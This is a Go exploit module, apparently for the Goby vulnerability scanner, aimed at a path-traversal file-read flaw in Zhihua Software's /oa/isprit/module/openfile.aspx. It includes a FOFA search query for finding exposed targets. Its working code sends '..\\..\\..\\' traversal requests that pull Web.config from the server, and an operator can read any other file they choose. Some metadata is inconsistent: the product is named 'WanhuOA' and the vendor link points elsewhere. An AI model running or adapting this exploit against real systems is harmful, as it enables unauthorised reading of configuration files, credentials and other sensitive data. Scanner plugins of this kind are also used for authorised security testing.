package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Zhihua Software /oa/isprit/module/openfile.aspx File Read Vulnerability",
    "Description": "<p>Zhihua Software is a company that focuses on providing comprehensive information solutions for fashion companies. Founded in 1998, Zhihua Software owns two brands, \"Zhihua Software\" and \"Yunjiandao\", which are positioned as traditional ERP and new retail overall solutions respectively. The company's products cover multiple fields such as omni-channel middle platform, retail distribution, production supply chain, WMS, e-commerce, CRM, mobile applications, big data, etc., aiming to help enterprises achieve intelligent and orderly distribution of goods, improve business collaboration capabilities and terminal management accuracy, and improve data analysis efficiency. Zhihua Software openfile.aspx has an arbitrary file reading vulnerability, which may lead to sensitive information leakage, data theft and other security risks, causing serious harm to the system and users.</p>",
    "Product": "WanhuOA",
    "Homepage": "https://f18erp.com/",
    "DisclosureDate": "2024-08-30",
    "PostTime": "2024-11-01",
    "Author": "2826161446@qq.com",
    "FofaQuery": "body=\"b28web/Utility/\" && body=\"F22WEB登陆\"",
    "GobyQuery": "body=\"b28web/Utility/\" && body=\"F22WEB登陆\"",
    "Level": "1",
    "Impact": "<p>Zhihua Software openfile.aspx has an arbitrary file reading vulnerability, which may lead to sensitive information leakage, data theft and other security risks, causing serious harm to the system and users.</p>",
    "Recommendation": "<p>1. Please pay attention to the manufacturer and update to the latest version: <a href=\"https://www.whir.net/2.\">https://www.whir.net/</a></p><p>2. Set access policies through firewalls and other security devices and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://blog.csdn.net/xc_214/article/details/143182199"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "Customize",
            "show": ""
        },
        {
            "name": "Customize",
            "type": "input",
            "value": "Web.config",
            "show": "mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Read"
    ],
    "VulType": [
        "File Read"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.0",
    "Translation": {
        "CN": {
            "Name": "志华软件 /oa/isprit/module/openfile.aspx 文件读取漏洞",
            "Product": "志华软件",
            "Description": "<p>&nbsp;‌志华软件是一家专注于为时尚企业提供综合性信息化解决方案的公司。‌ 成立于1998年，志华软件旗下拥有“志华软件”和“云间道”两个品牌，分别定位于传统ERP和新零售整体解决方案。公司的产品涵盖了全渠道中台、零售分销、生产供应链、WMS、电子商务、CRM、移动应用、大数据等多个领域，旨在帮助企业实现商品智能有序分配，提高业务协同能力和终端管理精度，提升数据分析效率‌。志华软件openfile.aspx存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "Recommendation": "<p>1、请及时关注厂商，更新到最新版本：<a href=\"https://www.whir.net/\">https://www.whir.net/</a></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>3、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>志华软件openfile.aspx存在任意文件读取漏洞，可能导致敏感信息泄露、数据盗窃及其他安全风险，从而对系统和用户造成严重危害。<br></p>",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Zhihua Software /oa/isprit/module/openfile.aspx File Read Vulnerability",
            "Product": "WanhuOA",
            "Description": "<p>Zhihua Software is a company that focuses on providing comprehensive information solutions for fashion companies. Founded in 1998, Zhihua Software owns two brands, \"Zhihua Software\" and \"Yunjiandao\", which are positioned as traditional ERP and new retail overall solutions respectively. The company's products cover multiple fields such as omni-channel middle platform, retail distribution, production supply chain, WMS, e-commerce, CRM, mobile applications, big data, etc., aiming to help enterprises achieve intelligent and orderly distribution of goods, improve business collaboration capabilities and terminal management accuracy, and improve data analysis efficiency. Zhihua Software openfile.aspx has an arbitrary file reading vulnerability, which may lead to sensitive information leakage, data theft and other security risks, causing serious harm to the system and users.<br></p>",
            "Recommendation": "<p>1. Please pay attention to the manufacturer and update to the latest version: <a href=\"https://www.whir.net/2.\">https://www.whir.net/</a></p><p>2. Set access policies through firewalls and other security devices and set whitelist access.</p><p>3. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Zhihua Software openfile.aspx has an arbitrary file reading vulnerability, which may lead to sensitive information leakage, data theft and other security risks, causing serious harm to the system and users.<br></p>",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9968"
}`
	postOrGet_zasqefasf123asdfafe1412afdawaq := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		getRequestConfig := httpclient.NewGetRequestConfig("/oa/isprit/module/openfile.aspx?Url=..\\..\\..\\" + fileUrl)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getRequestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to read file")
			return "", err
		}
		respTxt = resp.RawBody
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/oa/isprit/module/openfile.aspx?Url=..\\..\\..\\Web.config"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"Web.config": "<appSettings>",
			}
			// 函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},

		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"web_info": {"Web.config", "<appSettings>"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_zasqefasf123asdfafe1412afdawaq

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			expResult.Output = resp
			return expResult
		},
	))
}
